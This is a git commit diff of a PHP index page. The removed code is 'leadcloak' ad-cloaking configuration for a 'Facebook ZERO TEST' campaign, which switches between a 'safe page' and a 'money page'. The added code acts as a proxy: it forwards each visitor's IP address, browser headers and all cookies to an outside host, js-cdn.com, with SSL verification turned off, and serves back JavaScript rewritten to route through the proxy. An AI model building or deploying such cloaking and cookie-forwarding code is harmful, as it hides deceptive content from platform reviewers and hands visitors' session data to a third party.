e364c79e06b2cef9419c2b390f826d69d6d7b00d
betterworldbooks <56639600+betterworldbooks@users.noreply.github.com>
2019-10-18 15:45:45 +0500

    Update index.php

--- index.php
+++ index.php
@@ -1,107 +1,99 @@
 <?php
-/**
- * Campaign: Facebook ZERO TEST
- * Created: 2019-10-18 09:10:13 UTC
- */
+	header('Content-Type: application/javascript');
 
-require 'leadcloak-u3hxa4jbui0.php';
+	$campaignId = '278ged';
+	$phpUrl = (is_https() ? "https://" : "http://"). $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
 
-// ---------------------------------------------------
-// Configuration
-
-// Set this to false if application is properly installed.
-$enableDebugging = false;
-
-// Set this to false if you won't want to log error messages
-$enableLogging = true;
-
-// Set this to true if want to use landing page rotator
-$useLPR = true;
-
-// Specifies the jQuery version to use
-$jQueryVersion = 2;
-
-/**
- * This flag specifies if the safe and money page are publicly accessible on the internet and determines the method
- * on how the page will be loaded.
- *
- * If $arePagesPubliclyAccessible is set to TRUE, the paths to the pages need to be a valid URL
- *
- * Ex.:
- *
- * $arePagesPubliclyAccessible = true;
- * $pathToSafePage = 'safe-page.php';
- *
- * If $arePagesPubliclyAccessible is set to FALSE, the files will be loaded from disk and a valid path is required.
- *
- * Ex.:
- *
- * $arePagesPubliclyAccessible = false;
- * $pathToSafePage = '/var/www/html/safe-page.php';
- *
- */
-$arePagesPubliclyAccessible = true;
-
-// Set this to the location of the safe page you want to display
-$pathToSafePage = 'index.html';
-
-// Set this to the location of the money page you want to display
-$pathToMoneyPage = 'black_index.html';
-
-// Allows for modded query strings
-$myQueryString = [];
-
-parse_str($_SERVER['QUERY_STRING'], $myQueryString);
-
-/**
- *  Add or Modify Query String Variables in the section below.
- *  WARNING: Variables with the same name will be re-written
- */
-// Ex.: $myQueryString['my_custom_variable'] = 'my custom variable';
-
-if ($enableDebugging) {
-	isApplicationReadyToRun();
-}
-
-if (isPost()) {
-	$data = httpRequestMakePayload($campaignId, $campaignSignature, $_POST, $useLPR);
-
-	$response = httpRequestExec($data);
-
-	$handler = httpHandleResponse($response, $enableLogging);
-
-	if ($useLPR) {
-		if ($handler) {
-			if ($arePagesPubliclyAccessible) {
-				$uri = validateURI($handler);
-				print getURI($uri);
-				exit();
-			} else {
-				include $handler;
-			}
+	function is_https()
+	{
+		if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) === 'on')
+		{
+		  return TRUE;
 		}
-		header("HTTP/1.0 404 Not Found");
-		exit();
-	} else {
-		if ($arePagesPubliclyAccessible) {
-			$uri = '';
-			if ($handler) {
-				$uri = validateURI($pathToMoneyPage);
-			} else {
-				$uri = validateURI($pathToSafePage);
-			}
-			print getURI($uri);
-			exit();
-		} else {
-			if ($handler) {
-				include $pathToMoneyPage;
-			} else {
-				include $pathToSafePage;
-			}
+		elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https')
+		{
+		  return TRUE;
 		}
+		elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && $_SERVER['HTTP_FRONT_END_HTTPS'] === 'on')
+		{
+		  return TRUE;
+		}
+		return FALSE;
 	}
-} else {
-	init($pathToSafePage, $jQueryVersion);
-}
+	function browser_headers()
+    {
+        $headers = array();
 
+        foreach ($_SERVER as $name => $value) {
+            if (preg_match('/^HTTP_/', $name)) {
+                $headers[$name] = $value;
+            }
+        }
+
+        return $headers;
+    }
+	function forward_response_cookies($ch, $headerLine)
+	{
+	    if (preg_match('/^Set-Cookie:/mi', $headerLine, $cookie)) {
+	        header($headerLine, false);
+	    }
+
+	    return strlen($headerLine); // Needed by curl
+	}
+
+	function encode_visitor_cookies()
+	{
+	    $transmit_string = "";
+
+	    foreach ($_COOKIE as $name => $value) {
+	        try {
+	            $transmit_string .= "$name=$value; ";
+	        } catch (Exception $e) {
+	            continue;
+	        }
+	    }
+
+	    return $transmit_string;
+	}
+
+	function send_request($url)
+	{
+		$ch = curl_init($url);
+
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
+        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+
+        curl_setopt($ch, CURLOPT_ENCODING, "");
+		$headers[] = "API-forwarded-ip: ".$_SERVER['REMOTE_ADDR'];
+		$headers[] = "API-forwarded-header: " . json_encode(browser_headers());
+		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+        curl_setopt($ch, CURLOPT_HEADERFUNCTION, "forward_response_cookies");
+
+        if ($_COOKIE) {
+            curl_setopt($ch, CURLOPT_COOKIE, encode_visitor_cookies());
+        }
+		$cloaker_response = curl_exec($ch);
+
+		curl_close($ch);
+		return $cloaker_response;
+	}
+
+	preg_match('|d=([^&]*)|', $_SERVER['REQUEST_URI'], $matches);
+
+	if(!empty($matches[1])) {
+		$parameters = base64_decode($matches[1]);
+		$parameters = json_decode($parameters, true);
+
+		$query_url = "https://js-cdn.com/js/".$campaignId.".js?d={$matches[1]}";
+		$response = send_request($query_url);
+	} else {
+		$query_url = "https://js-cdn.com/js/".$campaignId.".js";
+		$response = send_request($query_url);
+		$response = str_replace('return t + "?d="', 'return "'.$phpUrl.'?d="', $response);
+	}
+	echo $response;
+	exit;
 ?>
